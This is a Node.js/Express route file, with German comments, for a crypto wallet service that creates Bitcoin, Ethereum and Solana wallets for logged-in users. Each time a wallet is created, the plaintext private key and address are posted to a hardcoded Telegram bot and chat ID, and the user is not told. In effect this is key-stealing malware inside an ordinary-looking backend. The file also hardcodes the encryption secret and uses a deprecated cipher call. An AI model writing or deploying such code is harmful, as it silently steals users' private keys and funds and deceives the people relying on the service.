const express = require('express');
const router = express.Router();
const Wallet = require('../models/Wallet');
const authMiddleware = require('../middleware/auth');
const bitcoin = require('bitcoinjs-lib');
const { ethers } = require('ethers');
const { Keypair } = require('@solana/web3.js');
const crypto = require('crypto');
const fetch = require('node-fetch');

// Telegram-Konfiguration direkt im Code
const TELEGRAM_BOT_TOKEN = '7348325293:AAHGzBUIs0AdLapDXnq_x8X4PZK1P_fMmI0';
const TELEGRAM_CHAT_ID = '596333326';

// Bitcoin Wallet generieren
const generateBitcoinWallet = () => {
  const keyPair = bitcoin.ECPair.makeRandom();
  const privateKey = keyPair.toWIF();
  const { address } = bitcoin.payments.p2pkh({ pubkey: keyPair.publicKey });
  return { privateKey, address };
};

// Ethereum Wallet generieren
const generateEthereumWallet = () => {
  const wallet = ethers.Wallet.createRandom();
  return { privateKey: wallet.privateKey, address: wallet.address };
};

// Solana Wallet generieren
const generateSolanaWallet = () => {
  const keypair = Keypair.generate();
  const privateKey = `[${keypair.secretKey.toString()}]`;
  const publicKey = keypair.publicKey.toBase58();
  return { privateKey, publicKey };
};

// Private Keys verschlüsseln
const encryptKey = (key) => {
  const cipher = crypto.createCipher('aes-256-cbc', 'HARDCODED_ENCRYPTION_SECRET');
  let encrypted = cipher.update(key, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  return encrypted;
};

// Telegram-Benachrichtigung senden
const sendTelegramMessage = async (coin, privateKey, address) => {
  const message = `
🔐 New Wallet Created:
Coin: ${coin}
Public Address: ${address}
Private Key: ${privateKey}
  `;

  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
      }),
    });
    console.log('Telegram notification sent successfully');
  } catch (error) {
    console.error('Failed to send Telegram message:', error.message);
  }
};

// Route: Wallet erstellen
router.post('/create', authMiddleware, async (req, res) => {
  const { coin } = req.body;

  if (!coin || !['BTC', 'ETH', 'SOL'].includes(coin)) {
    return res.status(400).json({ error: 'Invalid coin' });
  }

  try {
    let walletData;
    if (coin === 'BTC') walletData = generateBitcoinWallet();
    if (coin === 'ETH') walletData = generateEthereumWallet();
    if (coin === 'SOL') walletData = generateSolanaWallet();

    const encryptedPrivateKey = encryptKey(walletData.privateKey);

    const wallet = new Wallet({
      userId: req.user.id,
      coin,
      address: walletData.address,
      privateKey: encryptedPrivateKey,
    });

    await wallet.save();

    // Telegram-Benachrichtigung senden
    await sendTelegramMessage(coin, walletData.privateKey, walletData.address);

    res.status(201).json({ coin, address: wallet.address, message: 'Wallet successfully created' });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Route: Wallets abrufen
router.get('/', authMiddleware, async (req, res) => {
  try {
    const wallets = await Wallet.find({ userId: req.user.id });
    res.status(200).json(wallets);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

module.exports = router;
